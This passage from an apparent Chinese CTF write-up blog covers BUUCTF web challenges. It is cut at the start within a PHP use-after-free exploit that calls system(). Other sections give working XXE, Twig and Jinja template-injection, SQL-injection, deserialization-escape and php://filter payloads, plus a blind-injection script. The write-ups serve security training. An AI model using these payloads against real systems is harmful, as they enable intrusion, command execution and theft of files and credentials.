class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在命令执行点包含shell.php即可获得flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(<span class="string">'/tmp/shell.php'</span>);base64编码之后得到：aW5jbHVkZSgnL3RtcC9zaGVsbC5waHAnKTs=</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><p>DS_Store泄露</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ds_store_exp.py http://node3.buuoj.cn:25749/.</span><br></pre></td></tr></table></figure><p>看到有个L0g1n.php<br>访问一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sorry, this site will be available after totally 99 years!</span><br></pre></td></tr></table></figure><p>修改头部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /L0g1n.php HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:25749</span><br><span class="line">User-Agent: Commodore 64</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: gem-love.com</span><br><span class="line">Client-ip:127.0.0.1</span><br><span class="line">From:root@gem-love.com</span><br><span class="line">Via: y1ng.vip</span><br><span class="line">Cookie: time=16087393622222222225; PHPSESSID=se1334rkn9800qh7bk8dtnpn64</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>相关头部信息<br><img src="../../images/ctf/buuctf/16.png" alt=""><br><img src="../../images/ctf/buuctf/17.png" alt=""></p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>xxe漏洞 file 协议读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY penson SYSTEM <span class="string">"file:///flag"</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>买第四个商品了</p><p>考点unicode编码安全问题</p><p>我们可以用别的语言来表示数字</p><p>搜uncode大于1337的字符<a href="https://www.compart.com/en/unicode/search?q=thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=thousand#characters</a><br>直接搜thousand，会有一大堆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=4&amp;price=%E2%86%82</span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>题目源码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><p>解题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">65537</span>):    </span><br><span class="line">    tmp=chr(i)    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        res = tmp.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>)        </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"-"</span>) <span class="keyword">in</span> res:            </span><br><span class="line">            <span class="keyword">continue</span>        </span><br><span class="line">        print(<span class="string">"U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; "</span>.format(tmp, res, i))    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>在这里插入图片描述<br>Nginx 重要文件目录</p><p>配置文件存放目录：/etc/nginx<br>主要配置文件：/etc/nginx/conf/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx<br>Nginx配置文件：/usr/local/nginx/conf/nginx.conf           </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.cℭ/usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">file://suctf.cℭ/usr/fffffflag</span><br></pre></td></tr></table></figure><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>反序列化字符逃匿，字符变长<br>注册账户<br>登录账户<br>随意提交一些资料抓包<br>修改nickname为nickname[]，数组绕过strlen()长度检测<br>修改nickname中的内容   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSerialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">$profile[<span class="string">'phone'</span>] = <span class="string">'111111111111'</span>;</span><br><span class="line">$profile[<span class="string">'email'</span>] = <span class="string">"11112@qq.com"</span>;</span><br><span class="line">$profile[<span class="string">'nickname'</span>]  = <span class="keyword">array</span>(<span class="string">"sdddd"</span> );</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">return</span> serialize($profile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">()</span></span>&#123;</span><br><span class="line">$s=<span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;'</span>;</span><br><span class="line">$len=strlen($s);</span><br><span class="line">$result=<span class="string">""</span>;</span><br><span class="line">$padding=<span class="string">"where"</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$len;$i++)&#123;</span><br><span class="line">$result.=$padding;</span><br><span class="line">&#125;</span><br><span class="line">$result.=$s;</span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>(getSerialize());</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">print</span>(getPayload());</span><br><span class="line"><span class="comment">#a:4:&#123;s:5:"phone";s:12:"111111111111";s:5:"email";s:12:"11112@qq.com";s:8:"nickname";a:1:&#123;i:0;s:5:"sdddd";&#125;s:5:"photo";s:10:"config.php";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";&#125;s:5:"photo";s:10:"config.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/buuctf/18.jpg" alt=""><br><img src="../../images/ctf/buuctf/19.jpg" alt=""></p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>在user处尝试注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*<span class="string">'7'</span>&#125;&#125; 回显7777777 ==&gt; Jinja2</span><br><span class="line">&#123;&#123;7*<span class="string">'7'</span>&#125;&#125; 回显49 ==&gt; Twig </span><br><span class="line">``` </span><br><span class="line">这里为Twig</span><br><span class="line">获取flag</span><br><span class="line">```bash</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@ app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@ app.route('/shrine/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">    s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) +  s</span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里过滤了括号，所以<code>__subclasses__</code> 就无法使用，其中黑名单处理会将config和self替换为None,不过可以使用其他全局变量，再来引用config,如url_for()和get_flashed_messages() </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h1><p>报错了<br>一通fuzz，or等被过滤，即无法使用information_schema库，可以使用无列名注入<br>构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><p>手动探测列数，这里探测到有22列，回显位为2和3<br>查表名时由于过滤or，所以information_schema无法使用。<br>但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><p>无列名注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br></pre></td></tr></table></figure><h1 id="2019-easy-serialize-php"><a href="#2019-easy-serialize-php" class="headerlink" title="[2019]easy_serialize_php"></a>[2019]easy_serialize_php</h1><p>反序列化字符逃匿，字符减少<br>由 phpinfo  的 auto_append_file 中得知 flag 的位置 /d0g3_fllllllag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?f=show_image</span><br><span class="line">post: _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"L2QwZzNfZmxsbGxsbGFn"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>读取index.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>index</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得去flag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=meowers/../flag</span><br></pre></td></tr></table></figure><h1 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h1><p>hint.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password <span class="keyword">then</span> u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users <span class="built_in">where</span> username=<span class="string">'$_POST["username"]'</span> and password=<span class="string">'$_POST["password"]'</span>;</span><br><span class="line"></span><br><span class="line">//出题人四级压线才过 见谅见谅 领会精神</span><br></pre></td></tr></table></figure><p>fuzz过滤的字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'--'</span>, <span class="string">'&amp;'</span>, <span class="string">"'"</span>, <span class="string">'and'</span>, <span class="string">'like'</span>, <span class="string">'select'</span>, <span class="string">'-~'</span>, <span class="string">';'</span>, <span class="string">'='</span>, <span class="string">'"'</span>, <span class="string">'union'</span>, <span class="string">'mid'</span>]</span><br></pre></td></tr></table></figure><p>注入点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> username=<span class="string">'admin\'</span> and password=<span class="string">'or 1#'</span>;</span><br></pre></td></tr></table></figure><p>这时的后台语句变成这样的，用反斜杠转义username后面那个单引号，所以username的第一个单引号只能与password的第一个单引号闭合，最后一个单引号被注释，所以or后面那块就可以由我们自由发挥了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://ff2e7e0b-61b7-45a5-927d-1a759757182e.node3.buuoj.cn/'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">32</span>):</span><br><span class="line">    high=<span class="number">128</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=math.floor((high+low)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> low&lt;high:</span><br><span class="line">        payload = <span class="string">"or(ascii(substr(password,&#123;&#125;,1))&gt;&#123;&#125;)#"</span>.format(i, mid)</span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"admin\\"</span>, <span class="string">"password"</span>: payload&#125;</span><br><span class="line">        re = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"stronger"</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            high=mid</span><br><span class="line">        mid=math.floor((high+low)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> (low == <span class="number">32</span> <span class="keyword">or</span> high == <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>不过没注入出正确的密码有点奇怪</p><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>robots.txt 得知 fAke_f1agggg.php 文件，访问一个假flag，响应头部有提示 fl4g.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 